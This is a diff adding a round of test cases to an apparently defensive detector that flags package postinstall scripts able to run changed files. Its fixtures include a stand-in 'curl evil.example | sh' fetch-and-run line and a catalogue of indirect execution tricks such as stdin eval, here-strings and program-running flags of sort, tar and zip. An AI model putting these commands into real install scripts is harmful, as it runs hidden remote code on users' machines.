@@ -1005,3 +1005,59 @@ describe("round 24: redirects, here-strings, runners as consumers, stdin paths, 
     expect(held({ postinstall: "node build.js 2>&1 | tee log.txt" }, { "build.js": "1\n", "lib/a.js": "1\n" }, { "build.js": "1\n", "lib/a.js": "1\n", "README.md": "b\n" })).toBe(false);
   });
 });
+
+describe("round 25: stages with redirects, written files run by path, fed files' own content, program flags", () => {
+  const inert = (cmd: string, f = "test/x.sh", extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, ...scripts }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });
+
+  test("1. a shell given a script file in a stage with a redirect or after a lone &", () => {
+    for (const cmd of ["sh test/x.sh > /dev/null", "sh test/x.sh &>/dev/null", "sleep 0 & sh test/x.sh", "echo a >&2 && sh test/x.sh", "true >| /dev/null || sh test/x.sh", "true &&>/dev/null sh test/x.sh", "sh test/x.sh 2>&1"]) {
+      expect(inert(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("2. a written file run by path", () => {
+    const keep = { "b.js": "1\n" };
+    for (const [cmd, f] of [["cat test/x.sh > run.sh && sh ./run.sh", "test/x.sh"], ["cat test/x.sh > run.sh && chmod +x run.sh && ./run.sh", "test/x.sh"], ["cat test/x.js >> b.js && node ./b.js", "test/x.js"], ["cat test/x.js >| b.js && node b.js", "test/x.js"], ["cp test/x.js b.js >/dev/null && node b.js", "test/x.js"], ["mv test/x.js b.js && node ./b.js", "test/x.js"]] as const) {
+      expect(inert(cmd, f, keep), cmd).toBe(true);
+    }
+  });
+
+  test("3. here-string text, find into xargs, a numbered descriptor, a path as the command word of a substitution", () => {
+    for (const cmd of ["sh <<< 'sh test/x.sh'", "find test -name '*.sh' | xargs -I{} sh {}", "node /dev/fd/3 3< test/x.js", "sh <(./test/x.sh)"]) {
+      expect(inert(cmd, cmd.includes("x.js") ? "test/x.js" : "test/x.sh"), cmd).toBe(true);
+    }
+  });
+
+  test("4. a fed file's own content is read", () => {
+    const unchanged = { "scripts/x.sh": "node test/x.js\n" };
+    expect(held({ postinstall: "sh < scripts/x.sh" }, { ...unchanged, "test/x.js": "1\n" }, { ...unchanged, "test/x.js": "evil()\n" })).toBe(true);
+    expect(held({ postinstall: "cat scripts/x.sh | sh" }, { ...unchanged, "test/x.js": "1\n" }, { ...unchanged, "test/x.js": "evil()\n" })).toBe(true);
+    const list = { "scripts/list": "docs/b.js\n" };
+    expect(held({ postinstall: "cat scripts/list | xargs node" }, { ...list, "docs/b.js": "1\n" }, { ...list, "docs/b.js": "evil()\n" })).toBe(true);
+  });
+
+  test("5. a program that reads stdin through its own code flag", () => {
+    for (const cmd of ["cat test/x.js | node -e \"eval(require('fs').readFileSync(0,'utf8'))\"", "cat test/x.sh | bash -c '. /dev/stdin'", "cat test/x.py | python3 -c 'import sys; exec(sys.stdin.read())'"]) {
+      expect(inert(cmd, cmd.includes(".py") ? "test/x.py" : cmd.includes("x.js") ? "test/x.js" : "test/x.sh"), cmd).toBe(true);
+    }
+    expect(inert("cat test/x.sh | node -e 'console.log(1)'")).toBe(false);
+  });
+
+  test("6. flags of plain commands that run a program", () => {
+    for (const cmd of ["cat test/x.sh | split -n1 --filter=sh", "sort --compress-program=sh test/x.sh", "rg --pre sh foo test/", "tar -cf a.tar -F sh test/x.sh", "zip -TT sh a.zip test/x.sh"]) {
+      expect(inert(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("7. a package spec that is a local archive is not the trusted runner", () => {
+    expect(held({ postinstall: `npx pnpm${"@"}evil.tgz build`, build: "echo ok" }, { "lib/a.js": "1\n" }, { "lib/a.js": "evil()\n" })).toBe(true);
+    expect(held({ postinstall: `npx pnpm${"@"}8.1.0 build`, build: "echo ok" }, { "lib/a.js": "1\n" }, { "lib/a.js": "evil()\n" })).toBe(false);
+  });
+
+  test("8. the depth cap widens to every file", () => {
+    const scripts: Record<string, string> = { postinstall: "npm run s0" };
+    for (let i = 0; i < 80; i++) scripts[`s${i}`] = `npm run s${i + 1}`;
+    scripts.s80 = "npx -c 'node test/x.js'";
+    expect(held(scripts, { "test/x.js": "1\n" }, { "test/x.js": "evil()\n" })).toBe(true);
+  });
+});
